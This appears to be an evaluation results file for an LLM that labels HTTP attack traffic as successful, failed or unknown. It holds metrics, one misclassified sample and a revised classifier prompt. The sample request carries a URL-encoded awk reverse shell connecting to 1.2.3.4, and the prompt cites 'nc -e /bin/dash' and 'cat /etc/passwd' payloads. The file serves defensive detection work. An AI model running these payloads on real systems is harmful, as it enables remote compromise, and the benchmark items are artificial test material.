@@ -1,0 +1,71 @@
+{
+    "accuracy": 0.9666666666666667,
+    "classification_report": {
+        "FAILURE": {
+            "precision": 0.9411764705882353,
+            "recall": 1.0,
+            "f1-score": 0.9696969696969697,
+            "support": 16.0
+        },
+        "SUCCESS": {
+            "precision": 1.0,
+            "recall": 1.0,
+            "f1-score": 1.0,
+            "support": 5.0
+        },
+        "UNKNOWN": {
+            "precision": 1.0,
+            "recall": 0.8888888888888888,
+            "f1-score": 0.9411764705882353,
+            "support": 9.0
+        },
+        "accuracy": 0.9666666666666667,
+        "macro avg": {
+            "precision": 0.9803921568627452,
+            "recall": 0.9629629629629629,
+            "f1-score": 0.9702911467617351,
+            "support": 30.0
+        },
+        "weighted avg": {
+            "precision": 0.9686274509803922,
+            "recall": 0.9666666666666667,
+            "f1-score": 0.9661913250148544,
+            "support": 30.0
+        }
+    },
+    "confusion_matrix": [
+        [
+            5,
+            0,
+            0
+        ],
+        [
+            0,
+            16,
+            0
+        ],
+        [
+            0,
+            1,
+            8
+        ]
+    ],
+    "misclassified_examples": [
+        {
+            "uuid": "2025aitmg_sectest_prob_9",
+            "request": "POST /dd/qwer.php HTTP/1.1\nHost: 10.90.62.207\nConnection: keep-alive\nContent-Length: 169\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://10.90.62.207\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://10.90.62.207/dd/qwer.php\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: b2c3bd82a1e4b879s=f3RfyxBITwiVSqVt; dax_visitedfid=2; PHPSESSIDS=5dce171e2fab0814d67170153804f937; JSESSIONID=7EC8763159C501F251CF279EB54A52DC; ADMINCONSOLESESSION=6hXyhMBY31FMJgmtz4phX1wQ76ZTnKDby034pj3jC8bN367hbgnj!-1664826052; PHPSESSID=trnb9eikksfqq897tt47hljer1; zbx_sessionid=90fa087b53c83a273637cdf3c613c956; tab=2\n\nabc=awk+%27BEGIN%7Bs%3D%22%2Finet%2Ftcp%2F0%2F1.2.3.4%2F4915%22%3Bfor%28%3Bs%7C%26getline+c%3Bclose%28c%29%29while%28c%7Cgetline%29print%7C%26s%3Bclose%28s%29%7D%27",
+            "response": "HTTP/1.1 500 Internal Server Error\nDate: Thu, 16 Nov 2023 01:18:51 GMT\nContent-Type: application/json; charset=utf-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nX-Powered-By: Express\nVary: Origin, Accept-Encoding\nAccess-Control-Allow-Credentials: true\nETag: W/\"5e1-suLJzkL9cL4/1cTdq4x8KA\"\nContent-Encoding: gzip\nCache-Control: no-store\n\n{\"error\":{\"name\":\"Error\",\"status\":500,\"message\":\"bad argument for advertisement:adevent: create request account attribute should be string\",\"statusCode\":500,\"stack\":\"Error: bad argument for advertisement:adevent: create request account attribute should be string\\n    at defaultHandler (/rssp/code/turing/api/dist/api/node_modules/loopback/node_modules/strong-remoting/lib/rest-adapter.js:363:15)\\n    at restErrorHandler (/rssp/code/turing/api/dist/api/node_modules/loopback/node_modules/strong-remoting/lib/res\n",
+            "true_label": "UNKNOWN",
+            "predicted_label": "FAILURE",
+            "review_output": {
+                "review_result": "",
+                "review_analysis": ""
+            },
+            "llm_output": {
+                "reason": "Attack payload is present (awk command with BEGIN block). The response shows a generic API error unrelated to the payload, and there is no evidence of successful execution or block. The error message indicates a problem with the input argument, not the payload itself. Since the attack is not blind and the response does not provide confirmation of success or failure, it is classified as FAILURE.",
+                "label": "FAILURE"
+            }
+        }
+    ],
+    "prompt": "---\n\nAbsolutely! These misclassification examples reveal **two key weaknesses** in the current prompt:\n\n1. **Distinguishing “blind/indirect” attacks from genuine failures:**  \n   The prompt currently treats any non-error, non-leak, non-confirmation (like a generic 200 OK with a short string) as FAILURE, even in cases where the attack is “blind” and the response doesn’t give any confirmation either way.\n2. **Missing guidance on “indirect command execution” or “out-of-band” cases:**  \n   Some payloads (reverse shell, connect-back, etc.) are intended not to return output in the HTTP response. The prompt should instruct to recognize these and classify as UNKNOWN unless the response shows direct evidence of execution or failure.\n\nAdditionally, the template needs:\n- More **positive patterns for SUCCESS** (e.g., command output, file content, OS/network info).\n- More **negative patterns for FAILURE** (e.g., explicit error, “not found”, “forbidden”, etc.).\n- Explicit instructions for **blind attacks** or **out-of-band** payloads.\n- More focus on **response body content** (not just status code).\n\n---\n\n## **Specific Suggestions for Improvement**\n\n### 1. **Clarify “Blind” and Out-of-band Attacks**\n\nAdd a checklist:  \nIf the payload is for a command or reverse shell and the response is a generic “start”/“ok”/empty, and **no output, error, or leak appears**, label as **UNKNOWN** (not FAILURE).\n\n### 2. **Enhance SUCCESS Guidance**\n\nGive examples:  \nIf the response contains evidence of payload effect (e.g., command output, file content, system/network info), label as SUCCESS.\n\n### 3. **Expand FAILURE Guidance**\n\nAdd that generic 200 OK with known block/placeholder text (e.g., “start”, “processing”, “no data”, etc.) **without further evidence** is typically FAILURE **except** for blind attacks.\n\n### 4. **Add Patterns and Examples**\n\n- For “start</br>” or similar placeholders after reverse shell:  \n  → UNKNOWN  \n- For command output (IP configuration, file listing):  \n  → SUCCESS  \n- For generic error JSON with no relation to payload (API error):  \n  → UNKNOWN if unrelated, unless clear evidence of block.\n\n### 5. **Structural Improvement: Add Classification Checklist**\n\nBefore issuing the label, the LLM should “tick off” which criteria are satisfied.\n\n---\n\n# **REVISED PROMPT TEMPLATE**\n\n---\n\n**Prompt for LLM: HTTP Attack Traffic Classification (Enhanced & Precise)**\n\nYou are a specialized security traffic analyzer AI. Your job:  \n**Classify each HTTP request-response pair as SUCCESS, FAILURE, or UNKNOWN** based on attack outcome.\n\n---\n\n## **Step-by-Step Classification Checklist**\n\n### 1. **Check for Attack Payload**\n- Is there evidence of a web attack payload (SQLi, XSS, LFI, RFI, command injection, reverse shell, suspicious commands) in any part of the request?\n\n### 2. **Determine Attack Type**\n- Is the attack designed to return output in the HTTP response (e.g., command output, file contents, SQL error/data)?\n- ***OR***  \n- Is the attack “blind”/out-of-band (reverse shell, connect-back, etc.) where success wouldn’t be visible in HTTP response?\n\n### 3. **Analyze the Response**\n\n#### **A. SUCCESS**\n- **Criteria:**\n    - Attack payload is present.\n    - **AND** Response contains **direct evidence** of payload execution or attacker’s goal achieved:\n        - Command output (OS info, IP config, file listing, etc.).\n        - Sensitive data (e.g., /etc/passwd, DB records).\n        - Webshell output or explicit confirmation of code execution.\n        - Any response body reflecting attacker’s intended effect.\n- **Examples:**\n    - Response contains “Windows IP 配置” after running ipconfig command.\n    - Contains file contents, DB data, or system info.\n    - Echoed command output or webshell response.\n\n#### **B. FAILURE**\n- **Criteria:**\n    - Attack payload is present.\n    - **AND** Response shows **explicit evidence of blocking or failure**:\n        - Standard error codes/pages: 404, 403, 500, 301/302/307, etc.\n        - Error messages: “Not Found”, “Forbidden”, “Internal Error”, “Bad Argument”, “Bad Request”, or any generic error unrelated to payload execution.\n        - Reflection of payload as inert text (e.g., input echoed, not executed).\n        - Redirection to login/auth/error.\n        - Empty or generic body where output **should** appear (for direct-output attacks).\n    - **BUT:**  \n      For **blind attacks** (reverse shell, connect-back, etc.), if response is generic (“start”, “ok”, etc.) and there’s no way to confirm success or failure, **DO NOT** label as FAILURE—see UNKNOWN below.\n- **Examples:**\n    - 404/403/500 after LFI, SQLi, or command injection with expected output.\n    - 200 OK with empty or generic text after expected command output (except for blind attacks).\n    - API error JSON not referencing the payload.\n\n#### **C. UNKNOWN**\n- **Criteria:**\n    - No attack payload is detected.\n    - **OR** Attack payload is present, but:\n        - The attack is **blind** (e.g., reverse shell, connect-back, file upload for later access), and the response is generic (“start”, “ok”, empty, placeholder, or unrelated content).\n        - The response gives **no feedback** about success or failure (no output, no error, no data leak, no confirmation).\n        - The response is standard homepage, binary, encrypted, or unparseable.\n        - The response is a generic API error or unrelated message.\n- **Examples:**\n    - Response is just “start</br>”, “ok”, or blank after reverse shell/command connect-back payload.\n    - Response is unrelated API error not referencing input/payload.\n    - Response is homepage or static page, not tied to the request.\n\n---\n\n## **Special Edge Case Guidance**\n\n- **Blind/Out-of-band Attacks (e.g., reverse shell, connect-back, bind shell):**  \n  - If payload is for a shell/connect-back, and response is simply “start”, “ok”, or a generic placeholder with no error or output, label as **UNKNOWN**.\n  - Only label as SUCCESS if response shows evidence of execution (e.g., command output) or as FAILURE if response shows explicit block/error.\n- **Generic/Placeholder Responses:**  \n  - For non-blind attacks, if response is generic (e.g., “start”, “ok”, no output) where output is expected, label as FAILURE.\n- **API/JSON Errors:**  \n  - If response is a generic API error with no tie to payload, and the attack is not direct-output, label as UNKNOWN.\n- **Command Output Patterns:**  \n  - If response contains command output, system info, or file contents, label as SUCCESS.\n- **Reflection/Echo:**  \n  - If payload is echoed back as inert, not executed, label as FAILURE.\n\n---\n\n## **Concrete Example Patterns**\n\n**Example A (Blind reverse shell, generic response):**  \nRequest: POST ...abc=nc+-e+/bin/dash+...  \nResponse: 200 OK  \nBody: start</br>  \n→ **label: UNKNOWN**  \nReason: Blind payload (reverse shell); response contains only generic placeholder; cannot confirm execution.\n\n**Example B (Direct command, real output):**  \nRequest: GET ...?&C://Windows/System32/ipconfig  \nResponse: 200 OK  \nBody: Windows IP 配置 ...  \n→ **label: SUCCESS**  \nReason: Command output (IP config) returned; evidence of successful execution.\n\n**Example C (Command injection, generic error):**  \nRequest: ...abc=awk ...  \nResponse: 500 Internal Server Error  \nBody: {\"error\": ... \"bad argument for advertisement\"...}  \n→ **label: UNKNOWN**  \nReason: Error unrelated to payload; cannot confirm execution or block.\n\n**Example D (Direct command, empty response):**  \nRequest: ...abc=cat+/etc/passwd  \nResponse: 200 OK  \nBody:  \n→ **label: FAILURE**  \nReason: Direct-output attack; empty response where output expected.\n\n---\n\n## **Output Format**\n\n- `\"reason\": \"<cite criteria and checklist: e.g., 'Blind reverse shell payload; response is generic placeholder, cannot confirm execution.'>\"`\n- `\"label\": \"<SUCCESS | FAILURE | UNKNOWN>\"`\n\n---\n\n### **Analyze the following HTTP traffic exchange:**\nreq:  \n```\n{{req}}\n```\n\nrsp:  \n```\n{{rsp}}\n```\n---\n\n**Key Changes Recap:**\n- Clear distinction for blind/out-of-band attacks (reverse shell/connect-back): **UNKNOWN** unless explicit evidence.\n- More patterns/examples for command output, generic placeholders, API errors.\n- Checklist structure to guide LLM.\n- More guidance for direct-output vs. blind attacks.\n\n---\n\n**This revision should directly resolve the misclassifications and provide more robust, precise guidance for both the LLM and for future prompt engineering.**\n\n---"
+}
